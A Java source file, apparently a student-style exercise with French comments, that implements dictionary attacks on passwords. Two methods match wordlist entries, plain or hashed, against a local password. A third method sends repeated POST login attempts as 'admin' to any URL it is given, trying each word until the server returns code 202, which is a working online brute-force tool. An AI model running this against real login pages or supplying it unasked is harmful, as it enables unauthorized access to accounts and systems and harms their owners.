import java.io.*;
import java.net.URL;
import java.net.HttpURLConnection;
import java.nio.charset.StandardCharsets;

public class DictionaryAttack {
  private static void dictionarySimple(Password password, long startTime) {
    // Exploitation du fichier csv
    String cheminFichier = "dictionnaire.csv";
    BufferedReader br = null;
    String line = "";
    String cvsSplitBy = ";";

    try {
      br = new BufferedReader(new FileReader(cheminFichier));
      while ((line = br.readLine()) != null) {
        String[] mot = line.split(cvsSplitBy);
        if (mot[0].equals(password.getPassword())) {
          long endtime = System.currentTimeMillis();
          long tempsMis = endtime - startTime;
          System.out.println("Le mot de passe a été trouvé ! Il s'agissait de : " + mot[0]);
          System.out.println("Temps mis : " + tempsMis + " Milliseconde(s)");
          return;
        }
      }
    } catch (FileNotFoundException e) {
      e.printStackTrace();
    } catch (IOException e) {
      e.printStackTrace();
    } finally {
      if (br != null) {
        try {
          br.close();
        } catch (IOException e) {
          e.printStackTrace();
        }
      }
    }
    System.out.println("Le mot de passe n'a pas été trouvé.");
  }

  private static void dictionaryHashed(Password password, long startTime) {
    // Exploitation du fichier csv
    String cheminFichier = "dictionnaire.csv";
    BufferedReader br = null;
    String line = "";
    String cvsSplitBy = ";";

    try {
      br = new BufferedReader(new FileReader(cheminFichier));
      while ((line = br.readLine()) != null) {
        String[] mot = line.split(cvsSplitBy);
        if (mot[1].equals(password.getPassword()) == true) {
          long endtime = System.currentTimeMillis();
          long tempsMis = endtime - startTime;
          System.out.println("Le mot de passe a été trouvé ! Il s'agissait de : " +
              mot[0]);
          System.out.println("Temps mis : " + tempsMis + " Milliseconde(s)");
          return;
        }
      }
    } catch (FileNotFoundException e) {
      e.printStackTrace();
    } catch (IOException e) {
      e.printStackTrace();
    } finally {
      if (br != null) {
        try {
          br.close();
        } catch (IOException e) {
          e.printStackTrace();
        }
      }
    }
    System.out.println("Le mot de passe n'a pas été trouvé.");
  }

  private static void dictionaryOnline(String urlduSite) throws IOException {
    // Exploitation du fichier csv
    String cheminFichier = "dictionnaire.csv";
    BufferedReader br = null;
    String line = "";
    String cvsSplitBy = ";";

    // Initialisation du response code et de l'url du site
    String url = urlduSite;
    int responseCode = 0;

    try {
      br = new BufferedReader(new FileReader(cheminFichier));
      while ((line = br.readLine()) != null && responseCode != 202) {
        String[] mot = line.split(cvsSplitBy);
        // Initialisation de la requête avec les paramètres fournis
        String requestBody = "login=admin&password=" + mot[0];

        // Envoi de la requete
        try {
          responseCode = envoieRequetePost(url, requestBody);
          if (responseCode == 202) {
            System.out.println("ResponseCode: " + responseCode);
            System.out.println("Le mot de passe a été trouvé ! Il s'agissait de : " + mot[0]);
            return;
          }
        } catch (IOException e) {
          e.printStackTrace();
          System.out.println("Erreur, Veuillez vérifier l'url saisie.");
          return;
        }
      }
    } catch (FileNotFoundException e) {
      e.printStackTrace();
    } finally {
      if (br != null) {
        try {
          br.close();
        } catch (IOException e) {
          e.printStackTrace();
        }
      }
    }
    System.out.println("Le mot de passe n'a pas été trouvé.");

  }

  private static int envoieRequetePost(String url, String requestBody) throws IOException {
    // Initialisation de la requete
    URL endpoint = new URL(url);
    HttpURLConnection connection = (HttpURLConnection) endpoint.openConnection();
    connection.setRequestMethod("POST");
    connection.setDoOutput(true);
    connection.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
    connection.setRequestProperty("Content-Length", String.valueOf(requestBody.length()));
    try (OutputStream outputStream = connection.getOutputStream()) {
      outputStream.write(requestBody.getBytes(StandardCharsets.UTF_8));
      outputStream.flush();
    }
    int responseCode = connection.getResponseCode();
    connection.disconnect();
    return responseCode;
  }

  public static void dictionary(Password password) throws IOException {
    long startTime = System.currentTimeMillis();
    dictionaryHashed(password, startTime);

  }

  public static void dictionary(String urlduSite) throws IOException {
    dictionaryOnline(urlduSite);
  }

}
